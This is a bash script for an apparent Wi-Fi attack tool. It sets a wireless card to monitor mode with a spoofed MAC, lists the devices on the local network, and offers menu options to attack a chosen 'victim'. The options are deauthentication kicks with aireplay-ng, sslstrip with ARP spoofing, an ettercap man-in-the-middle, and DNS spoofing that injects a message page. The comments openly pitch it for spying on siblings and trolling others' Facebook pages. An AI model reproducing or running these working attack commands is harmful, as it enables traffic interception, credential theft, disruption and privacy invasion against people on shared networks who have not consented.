#!/bin/bash
cd $HOME\/artimos
#resize the screen to fit the program
resize -s 30 110  > /dev/null 2>&1
bash openScreen.sh &
#empty the nmap info files
echo "" > afterInfo.txt
echo "" > info.txt
#start the nmap loop in the background
bash storeInfo.sh &
#your network variables...
interface=(`route -n | grep 'UG[ \t]' | awk '{print $8}'`)
gateway=(`route -n | grep 'UG[ \t]' | awk '{print $2}' | head -n 1`)
gatemac=(`iwconfig $interface | grep -w $interface -A1 | awk '{print $6}'`)
myIp=(`ifconfig | grep -w $interface -A1 | awk '{print $2}' | tail -n 1 | cut -d ":" -f2`)
myMac=(`ifconfig | grep -w $interface | awk '{print $5}'`)
frequency=(`iwconfig $interface  | grep Frequency | awk -F' ' '{ print $2 }' | cut -d ":" -f2 `)
channel=""
afterMe=false
declare -a nameStore
#little trick to find your channel
case $frequency in
2.412)
channel=1
;;
2.417)
channel=2
;;
2.422)
channel=3
;;
2.427)
channel=4
;;
2.432)
channel=5
;;
2.437)
channel=6
;;
2.442)
channel=7
;;
2.447)
channel=8
;;
2.452)
channel=9
;;
2.457)
channel=10
;;
2.462)
channel=11
;;
2.467)
channel=12
;;
2.472)
channel=13
;;
2.484)
channel=14
;;
5.240)
channel=48
;;
5.260)
channel=52
;;
5.280)
channel=56
;;
5.300)
channel=60
;;
5.320)
channel=64
;;
5.500)
channel=100
;;
5.520)
channel=104
;;
5.540)
channel=108
;;
5.560)
channel=112
;;
5.580)
channel=116
;;
5.660)
channel=132
;;
5.680)
channel=136
;;
5.700)
channel=140
;;
5.745)
channel=149
;;
5.765)
channel=153
;;
5.785)
channel=157
;;
5.805)
channel=161
;;
5.825)
channel=165
;;
esac
# starts your interface in monitor mode and in the correct channel with a random MAC address
# p.s. Good idea to roll your wlan MAC address before starting this program
airmon-ng stop mon0 > /dev/null 2>&1
airmon-ng start $interface $channel > /dev/null 2>&1
ifconfig mon0 down
macchanger -r mon0 > /dev/null 2>&1
ifconfig mon0 up
bash airodumpInfo.sh &
sleep 6
#naming function for giving nicknames to your friend's MAC addresses and saves them to personalNameInfo.txt
function name(){
ipSelect=""
mac=""
tempName=""
echo "What IP would you like to give a name for?"
read ipSelect
echo "What Would you like to name it?(No spaces!, 8-16 characters please)"
read tempName
mac=(`cat afterInfo.txt | grep -w $ipSelect -A1 | tail -n 1 | awk '{print $3}'`)
echo "$mac $tempName" >> personalNameInfo.txt
}
#kicking local IP or nickname, not very usful except for crashing someone's minecraft game ;)
function kick(){
name=""
ip=""
choice=""
echo "Would you like to kick by name or IP?"
read choice
case "$choice" in
	"name")
		read -p "Please enter victim name: " name


		for (( i=0; i<=${#nameStore[@]}; i++ )); do
			nameTest=(`echo "${nameStore[i]}" | cut -d '-' -f1`) 
			ipList=(`echo "${nameStore[i]}" | cut -d '-' -f2`) 
			if [ "$nameTest" == "$name" ]; then
				ip=$ipList
			fi
			nameTest=""
			ipList=""
		done
		mac=(`cat afterInfo.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
		ips=(`cat afterInfo.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
		for (( i=0; i<=${#mac[@]}; i++ )); do
			if [ "${ips[i]}" == "$myIp" ]; then
				afterMe=true
			else
				if [ "${ips[i]}" == "$ip" ]; then
					if ! $afterMe; then
						aireplay-ng -0 10 -a $gatemac -c ${mac[i]} mon0
						read -p dfsdf
					else
						aireplay-ng -0 10 -a $gatemac -c ${mac[i-1]} mon0
						read -p dfsdf
					fi
				fi
			fi
		done
		afterMe=false
		;;
	"ip")
		read -p "Please enter victim IP: " ip
			mac=(`cat afterInfo.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
			ips=(`cat afterInfo.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
		for (( i=0; i<=${#mac[@]}; i++ )); do
			if [ "${ips[i]}" == "$myIp" ]; then
				afterMe=true
			else
				if [ "${ips[i]}" == "$ip" ]; then
					if ! $afterMe; then
						aireplay-ng -0 10 -a $gatemac -c ${mac[i]} mon0
					else
						aireplay-ng -0 10 -a $gatemac -c ${mac[i-1]} mon0
					fi
				fi
			fi
		done
		afterMe=false
		;;
esac
}
#sslstrip some poor victim to troll their facebook page
function sslstrip(){
ip=""
read -p "Please enter victim IP: " ip
echo 1 > /proc/sys/net/ipv4/ip_forward
gnome-terminal --geometry 100x30-0+0 -x bash sslstrip/sslstrip.sh
arpspoof -i $interface -t $ip $gateway &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -w sslstrip/$gatemac-$ip
kill $!
}
#just if you're curious of what your siblings are always looking at on their phone..
function mitm(){
ip=""
read -p "Please enter victim IP: " ip
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -i $interface -TQM arp:remote /$gateway/ /$ip/
}
#send your victim a friendly message on their browser screen, kinda buggy
function dns(){
ip=""
message=""
echo -e "$myIp *com\n$myIp www*\n$myIp mail*\n$myIp https*" > spoofhosts.txt
sudo /etc/init.d/apache2 start
echo "Please enter an IP address"
read ip
echo "Please enter the message to send"
read message
echo "<html><body><head><title>ATTENTION!!</title></head><h1>$message</h1></body></html>" > /var/www/index.php
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $interface -t $ip $gateway &
arpspoof -i $interface -t $gateway $ip &
dnsspoof -i $interface -f  spoofhosts.txt host  $ip  and  udp  port 53
}

#main network analyzer output
while true;do
	if [ -t 0 ]; then stty -echo -icanon time 0 min 0; fi
	keypress=''
	while [ "x$keypress" = "x" ]; do
		if ! diff afterInfo.txt info.txt > /dev/null ; then
			clear
			#your information and creates arrays of the nmap info
			echo "Your Interface: "$interface
			echo "Your IP: "$myIp
			macVendorAssign=""
			mac=(`cat info.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
			ip=(`cat info.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
			macId=(`cat info.txt | grep -w 'MAC' | awk '{print $3}' | cut -c 1-8`)
			macIdName=(`cat info.txt | grep -w 'MAC' | cut -d' ' -f 4- | sed -e 's/ /_/g'`)
			idListMac=(`cat macIds.txt | awk '{print $1}'`)
			idListName=(`cat macIds.txt | awk '{print $2}'`)
			echo -e "MAC:\t\t\tIP:\t\tWho they are:\tPackets:\tDevice type:"
			for (( i=0; i<=${#mac[@]}; i++ )); do
				if [ "${ip[i]}" == "$myIp" ]; then
					#output the line of your MAC and IP
					echo -e "$myMac\t$myIp\tThis is You"
					afterMe=true
				else
					#output all the MACs and their info that are before yours in the arrays
					if ! $afterMe; then
						nameAssign=(`cat personalNameInfo.txt | grep -w ${mac[i]} | awk '{print $2}'`)
						packets=(`cat airodumpInfo-01.csv | grep -w ${mac[i]} | awk '{print $7}' | tail -n 1 | cut -d "," -f1`)
						if [ "$nameAssign" = "" ]; then
							nameAssign="\t" 
						fi
						for (( j=0; j<=${#idListMac[@]}; j++ )); do 
							if [ "${macId[i]}" == "${idListMac[j]}" ]; then
								macVendorAssign=${idListName[j]}
							fi
						done
						if [ "$macVendorAssign" = "" ]; then
							macVendorAssign=${macIdName[i]}
						fi
						echo -e "${mac[i]}\t${ip[i]}\t$nameAssign\t$packets\t\t$macVendorAssign"
					else
						#output all the MACs and their info that are after yours in the arrays
						nameAssign=(`cat personalNameInfo.txt | grep -w ${mac[i-1]} | awk '{print $2}'`)
						packets=(`cat airodumpInfo-01.csv | grep -w ${mac[i-1]} | awk '{print $7}' | tail -n 1 | cut -d "," -f1`)
						if [ "$nameAssign" = "" ]; then
							nameAssign="\t" 
						fi
						for (( j=0; j<=${#idListMac[@]}; j++ )); do 
							if [ "${macId[i-1]}" == "${idListMac[j]}" ]; then
								macVendorAssign=${idListName[j]}
							fi
						done
						if [ "$macVendorAssign" = "" ]; then
							macVendorAssign=${macIdName[i-1]} 
						fi
						echo -e "${mac[i-1]}\t${ip[i]}\t$nameAssign\t$packets\t\t$macVendorAssign"
					fi
					#add to local nameStore and clears other local variables
					nameStore[i]="$nameAssign-${ip[i]}"
					nameAssign=""
					packets=""
					macVendorAssign=""
				fi
			done
			afterMe=false
			cat info.txt > afterInfo.txt
			#options for the commands
			echo "Press 'n' to name an IP"
			echo "Press 'k' to kick someone"
			echo "Press 's' for sslstrip"
			echo "Press 'm' for MITM"
			echo "Press 'd' for DNS Message"
		fi
		read keypress
	done
	if [ -t 0 ]; then stty sane; fi
	#case switch for the commands
	case "$keypress" in
		"n")
			name
			;;
		"l")
			echo "nameStore Debugging:   "${nameStore[@]}
			read -p "Press any key to continue"
			;;
		"k")
			kick
			;;
		"s")
			sslstrip
			;;
		"m")
			mitm
			;;
		"d")
			dns
			;;
	esac
done
read -p "done"
